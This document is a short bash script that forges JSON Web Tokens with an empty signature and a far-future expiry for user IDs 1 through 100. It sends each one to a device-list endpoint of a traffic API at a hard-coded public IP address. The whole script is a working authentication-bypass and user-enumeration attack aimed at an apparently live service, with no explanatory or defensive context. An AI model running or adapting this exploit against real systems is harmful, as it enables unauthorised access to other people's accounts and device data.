#!/bin/bash
#
# vim:ft=sh

QSTAMP_API_URL="http://1.116.190.119/traffic/api/v2"
api=device/list
header=eyJhbGciOiJIUzI1NiJ9 # {"alg":"HS256"}
exp=$(date +%s -d'2099-12-31')

for i in {1..100}
do
    payload=$(echo -n "{\"exp\":$exp,\"username\":\"$i\"}" | basenc --base64url)
    payload=${payload%%=*}
    token=$header.$payload.
    echo uid: $i, token: $token
    curl -H "tToken: $token" "$QSTAMP_API_URL/$api"
    echo 
done
